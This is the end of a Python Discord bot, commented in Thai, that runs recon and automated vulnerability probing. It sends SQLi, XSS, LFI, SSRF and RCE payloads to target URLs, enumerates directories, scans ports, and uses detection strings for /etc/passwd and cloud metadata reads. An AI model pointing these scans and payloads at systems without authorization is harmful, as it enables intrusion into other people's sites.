        return any(payload in text for payload in PAYLOAD_TEMPLATES['xss'])

    def lfi_validator(text):
        lower_text = text.lower()
        return any(sig in lower_text for sig in LFI_SIGNATURES)

    def ssrf_validator(text):
        lower_text = text.lower()
        ssrf_indicators = [
            '127.0.0.1', 'localhost', '0.0.0.0', '169.254.169.254',
            'metadata.google.internal', 'file://', 'dict://', 'gopher://',
            'root:', 'uid=', 'gid='
        ]
        return any(indicator in lower_text for indicator in ssrf_indicators)

    def rce_validator(text):
        lower_text = text.lower()
        rce_indicators = [
            'uid=', 'gid=', 'groups=', 'whoami', 'id', 'uname',
            'linux', 'root', 'www-data', 'apache', 'nginx'
        ]
        return any(indicator in lower_text for indicator in rce_indicators)

    validator = {
        'sqli': sqli_validator,
        'xss': xss_validator,
        'lfi': lfi_validator,
        'ssrf': ssrf_validator,
        'rce': rce_validator
    }.get(attack_type)

    payloads = PAYLOAD_TEMPLATES[attack_type]
    results = scan_autoattack(url, payloads, validator)
    if results:
        message = "✅ พบรูปแบบที่น่าสงสัย:\n"
        for candidate, status in results[:5]:
            message += f"• `{candidate}` (HTTP {status})\n"
        await ctx.send(message)
    else:
        await ctx.send("❌ ไม่พบผลลัพธ์ที่ชัดเจนจากการทดสอบอัตโนมัติ")

@bot.command()
async def dir(ctx, url: str):
    """ตรวจสอบ Directory พื้นฐานบนเว็บไซต์เป้าหมาย"""
    if not url.startswith("http"):
        url = "http://" + url
    
    await ctx.send(f"🔎 กำลังสแกนหา Directory บน `{url}`...")
    found = []
    
    for path in COMMON_DIRS:
        target = f"{url.rstrip('/')}/{path}"
        try:
            # ลองส่ง Request ไปตรวจสอบ
            r = requests.get(target, timeout=3)
            if r.status_code == 200:
                found.append(f"✅ FOUND: `{target}` (200 OK)")
            elif r.status_code == 403:
                found.append(f"🔒 FORBIDDEN: `{target}` (403)")
        except:
            pass
            
    if found:
        await ctx.send("\n".join(found))
    else:
        await ctx.send("❓ ไม่พบ Directory ที่ระบุในรายการค้นหาพื้นฐาน")

@bot.command()
async def loc(ctx, ip: str):
    """ตรวจสอบที่ตั้งและข้อมูลของ IP Address"""
    try:
        # ใช้ API ฟรีของ ip-api.com
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        
        if r['status'] == 'success':
            embed = discord.Embed(title=f"🌐 IP Info: {ip}", color=0x3498db)
            embed.add_field(name="📍 Country", value=f"{r['country']} ({r['countryCode']})", inline=True)
            embed.add_field(name="🏙️ City", value=r['city'], inline=True)
            embed.add_field(name="🏢 ISP", value=r['isp'], inline=False)
            embed.add_field(name="🗺️ Lat/Lon", value=f"{r['lat']}, {r['lon']}", inline=True)
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"❌ ไม่พบข้อมูลสำหรับ IP: `{ip}`")
    except Exception as e:
        await ctx.send(f"⚠️ เกิดข้อผิดพลาด: `{str(e)}`")

@bot.command()
async def exif(ctx):
    """สกัด Metadata จากรูปภาพที่อัปโหลด"""
    if not ctx.message.attachments:
        return await ctx.send("📸 กรุณาอัปโหลดรูปภาพพร้อมกับพิมพ์คำสั่ง `!exif` ครับ")

    for attachment in ctx.message.attachments:
        img_data = await attachment.read()
        try:
            image = Image.open(io.BytesIO(img_data))
            info = image._getexif()
            if info:
                msg = "🖼️ **EXIF Data Found:**\n"
                for tag, value in info.items():
                    decoded = TAGS.get(tag, tag)
                    msg += f"• `{decoded}`: {value}\n"
                await ctx.send(msg[:2000]) # ป้องกันข้อความยาวเกิน
            else:
                await ctx.send("❌ ไม่พบข้อมูล EXIF ในรูปนี้ครับ")
        except Exception as e:
            await ctx.send(f"⚠️ วิเคราะห์ไฟล์ไม่ได้: {e}")

@bot.command()
async def strings(ctx):
    """ดึงข้อความที่อ่านออกได้จากไฟล์ (เหมือนคำสั่ง strings ใน Linux)"""
    if not ctx.message.attachments:
        return await ctx.send("📂 กรุณาอัปโหลดไฟล์ที่ต้องการวิเคราะห์ครับ")

    for attachment in ctx.message.attachments:
        file_data = await attachment.read()
        try:
            if command_exists('strings'):
                output_bytes = subprocess.check_output(
                    ['strings', '-n', '4', '-'],
                    input=file_data,
                    stderr=subprocess.DEVNULL
                )
                output = output_bytes.decode('utf-8', errors='ignore')
                lines = [l for l in output.split('\n') if len(l) > 4]
            else:
                lines = extract_strings_from_bytes(file_data)

            result = "\n".join(lines[:20]) # เอามาแค่ 20 บรรทัดแรก
            await ctx.send(f"📄 **Strings Found (Preview):**\n```\n{result}\n```")
        except Exception as e:
            await ctx.send(f"❌ ไม่สามารถดึงข้อมูลจากไฟล์นี้ได้: {e}")

# --- [ NEW: Automated Recon Pipeline ] ---
@bot.command()
@is_owner()
async def recon(ctx, target: str):
    """ทำงานอัตโนมัติ: subdomain + portscan + dir + headers + sslcheck"""
    target = target.strip().split('/')[0]
    if not is_public_host(target):
        return await ctx.send("⚠️ เป้าหมายไม่ปลอดภัยหรือเป็น internal host")
    await ctx.send("🔍 **เริ่ม Automated Recon Pipeline...**")
    
    results = {}
    
    # Subdomain
    try:
        response = requests.get(f"https://api.hackertarget.com/hostsearch/?q={target}", timeout=10)
        if response.status_code == 200:
            subdomains = [line.split(',')[0] for line in response.text.strip().split('\n') if line]
            results['subdomains'] = subdomains[:10]  # Limit to 10
        else:
            results['subdomains'] = ["API ไม่พร้อมใช้งาน"]
    except:
        results['subdomains'] = ["ไม่สามารถค้นหาได้"]
    
    # Portscan (basic)
    try:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        open_ports = []
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        results['open_ports'] = open_ports
    except:
        results['open_ports'] = ["ไม่สามารถสแกนได้"]
    
    # Directory enumeration
    try:
        dirs_found = []
        for dir_name in COMMON_DIRS:
            url = f"http://{target}/{dir_name}"
            try:
                resp = requests.head(url, timeout=5)
                if resp.status_code < 400:
                    dirs_found.append(dir_name)
            except:
                pass
        results['directories'] = dirs_found
    except:
        results['directories'] = ["ไม่สามารถสแกนได้"]
    
    # Headers
    try:
        resp = requests.get(f"http://{target}", timeout=10)
        headers = dict(resp.headers)
        results['headers'] = {k: v for k, v in list(headers.items())[:5]}  # Limit
    except:
        results['headers'] = {"ไม่สามารถดึงได้": "timeout"}
    
    # SSL Check
    try:
        cert = ssl.get_server_certificate((target, 443))
        results['ssl'] = "✅ มีใบรับรอง SSL"
    except:
        results['ssl'] = "❌ ไม่มี SSL หรือไม่สามารถตรวจสอบได้"
    
    # สร้าง embed รายงาน
    embed = discord.Embed(title=f"🔍 Recon Report: {target}", color=0x3498db)
    embed.add_field(name="🌐 Subdomains", value="\n".join(results['subdomains']) or "ไม่มี", inline=False)
    embed.add_field(name="🔌 Open Ports", value=", ".join(map(str, results['open_ports'])) or "ไม่มี", inline=True)
    embed.add_field(name="📁 Directories", value=", ".join(results['directories']) or "ไม่มี", inline=True)
    embed.add_field(name="📋 Headers", value="\n".join([f"{k}: {v}" for k, v in results['headers'].items()]) or "ไม่มี", inline=False)
    embed.add_field(name="🔒 SSL", value=results['ssl'], inline=True)
    
    await ctx.send(embed=embed)

# --- [ NEW: Full Auto Vulnerability Scan ] ---
@bot.command()
@is_owner()
async def fullscan(ctx, url: str):
    """ตรวจสอบทุกประเภทช่องโหว่โดยอัตโนมัติ"""
    normalized_url = normalize_url(url)
    if not normalized_url:
        return await ctx.send("⚠️ URL ไม่ปลอดภัยหรือไม่ถูกต้อง")
    url = normalized_url
    await ctx.send("🛡️ **เริ่ม Full Vulnerability Scan...**")
    
    vulnerabilities = {}
    types = ['sqli', 'xss', 'lfi', 'ssrf', 'rce']
    
    for vuln_type in types:
        try:
            # Reuse autoattack logic
            if vuln_type == 'sqli':
                validator = lambda resp: 'sql' in resp.text.lower() or 'mysql' in resp.text.lower() or 'syntax' in resp.text.lower()
            elif vuln_type == 'xss':
                validator = lambda resp: '<script>' in resp.text or 'alert(' in resp.text
            elif vuln_type == 'lfi':
                validator = lambda resp: 'root:' in resp.text or '/etc/passwd' in resp.text
            elif vuln_type == 'ssrf':
                validator = lambda resp: 'internal' in resp.text.lower() or resp.status_code == 200
            elif vuln_type == 'rce':
                validator = lambda resp: 'command' in resp.text.lower() or 'exec' in resp.text.lower()
            
            payloads = PAYLOAD_TEMPLATES.get(vuln_type, [])[:3]  # Test first 3 payloads
            found = False
            for payload in payloads:
                test_url = url + payload
                try:
                    resp = requests.get(test_url, timeout=5)
                    if validator(resp):
                        found = True
                        break
                except:
                    pass
            vulnerabilities[vuln_type] = "🚨 พบช่องโหว่!" if found else "✅ ปลอดภัย"
        except:
            vulnerabilities[vuln_type] = "⚠️ ไม่สามารถตรวจสอบได้"
    
    # สร้างรายงาน
    embed = discord.Embed(title=f"🛡️ Vulnerability Scan: {url}", color=0xff0000 if any('🚨' in v for v in vulnerabilities.values()) else 0x00ff00)
    for vuln, status in vulnerabilities.items():
        embed.add_field(name=vuln.upper(), value=status, inline=True)
    
    await ctx.send(embed=embed)

# --- [ NEW: CTF Auto-Solver ] ---
@bot.command()
async def autosolve(ctx, challenge_type: str, *, input_text: str):
    """แก้โจทย์ CTF อัตโนมัติ: crypto, web, encoding"""
    await ctx.send(f"🧠 **เริ่ม Auto-Solve: {challenge_type}...**")
    
    result = "ไม่สามารถแก้ได้"
    
    if challenge_type.lower() == 'crypto':
        # Use existing smart_decode
        decoded = smart_decode(input_text)
        if decoded:
            result = "\n".join(decoded)
        else:
            # Try ciphey if available
            if command_exists('ciphey'):
                try:
                    proc = await asyncio.create_subprocess_exec(
                        'ciphey', '--text', input_text,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, stderr = await proc.communicate()
                    if stdout:
                        result = stdout.decode().strip()
                except:
                    pass
    
    elif challenge_type.lower() == 'web':
        # Basic SQLi detection
        if 'union' in input_text.lower() or 'select' in input_text.lower():
            result = "อาจเป็น SQL Injection: ลองใช้ payload เช่น ' OR 1=1 --"
        else:
            result = "ไม่พบ pattern ที่รู้จัก"
    
    elif challenge_type.lower() == 'encoding':
        # Try multiple decodings
        try:
            decoded = input_text
            for _ in range(3):  # Max 3 layers
                if decoded.startswith(('http', 'ftp')):
                    break
                try:
                    decoded = base64.b64decode(decoded).decode('utf-8')
                except:
                    try:
                        decoded = binascii.unhexlify(decoded.replace(' ', '')).decode('utf-8')
                    except:
                        break
            result = f"Decoded: {decoded}"
        except:
            result = "ไม่สามารถ decode ได้"
    
    await ctx.send(f"🧠 **Auto-Solve Result:**\n{result}")

# --- [ NEW: Scheduled Monitoring ] ---
monitoring_tasks = {}

@bot.command()
@is_owner()
async def monitor(ctx, url: str, interval_hours: int = 1):
    """ตรวจสอบเว็บไซต์เป็นระยะ และแจ้งเตือนเมื่อเปลี่ยนแปลง"""
    normalized_url = normalize_url(url)
    if not normalized_url:
        return await ctx.send("⚠️ URL ไม่ปลอดภัยหรือไม่ถูกต้อง")
    url = normalized_url
    if ctx.author.id in monitoring_tasks:
        await ctx.send("⚠️ คุณมี monitoring task อยู่แล้ว ยกเลิกก่อน")
        return
    
    await ctx.send(f"👀 **เริ่ม Monitoring: {url} ทุก {interval_hours} ชั่วโมง**")
    
    async def monitor_task():
        last_hash = None
        while True:
            try:
                resp = requests.get(url, timeout=10)
                current_hash = hashlib.md5(resp.text.encode()).hexdigest()
                if last_hash and last_hash != current_hash:
                    await ctx.send(f"🚨 **เปลี่ยนแปลงที่ {url}!** Hash: {current_hash}")
                last_hash = current_hash
            except Exception as e:
                await ctx.send(f"⚠️ **Monitoring Error for {url}:** {e}")
            await asyncio.sleep(interval_hours * 3600)
    
    task = asyncio.create_task(monitor_task())
    monitoring_tasks[ctx.author.id] = task
    
    await ctx.send("✅ Monitoring เริ่มแล้ว! ใช้ `!stopmonitor` เพื่อหยุด")

@bot.command()
@is_owner()
async def stopmonitor(ctx):
    """หยุด monitoring task"""
    if ctx.author.id in monitoring_tasks:
        monitoring_tasks[ctx.author.id].cancel()
        del monitoring_tasks[ctx.author.id]
        await ctx.send("🛑 Monitoring หยุดแล้ว")
    else:
        await ctx.send("❌ ไม่มี monitoring task ที่กำลังทำงาน")

# --- [ NEW: Payload Testing Suite ] ---
@bot.command()
@is_owner()
async def testpayload(ctx, vuln_type: str, url: str):
    """สร้างและทดสอบ payload จริงกับเป้าหมาย"""
    normalized_url = normalize_url(url)
    if not normalized_url:
        return await ctx.send("⚠️ URL ไม่ปลอดภัยหรือไม่ถูกต้อง")
    url = normalized_url
    await ctx.send(f"💣 **เริ่ม Payload Testing: {vuln_type} on {url}...**")
    
    payloads = PAYLOAD_TEMPLATES.get(vuln_type.lower(), [])
    if not payloads:
        await ctx.send("❌ ไม่มี payload สำหรับประเภทนี้")
        return
    
    results = []
    for i, payload in enumerate(payloads[:5]):  # Test first 5
        test_url = url + payload
        try:
            resp = requests.get(test_url, timeout=5)
            status = "✅" if resp.status_code < 400 else "❌"
            vulnerable = "🚨" if any(keyword in resp.text.lower() for keyword in ['error', 'sql', 'script', 'passwd', 'internal']) else "✅"
            results.append(f"{i+1}. {status} {vulnerable} {payload[:50]}...")
        except:
            results.append(f"{i+1}. ⚠️ Timeout: {payload[:50]}...")
    
    embed = discord.Embed(title=f"💣 Payload Test Results: {vuln_type}", color=0xffa500)
    embed.add_field(name="Results", value="\n".join(results), inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("⛔ **สิทธิ์ไม่พอ:** คำสั่งนี้ใช้ได้เฉพาะเจ้าของบอทเท่านั้น")
    else:
        await ctx.send(f"⚠️ เกิดข้อผิดพลาด: `{error}`")

if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN ไม่ถูกตั้งค่าใน environment. โปรดตั้งค่า DISCORD_TOKEN ก่อนรันบอท")

bot.run(TOKEN)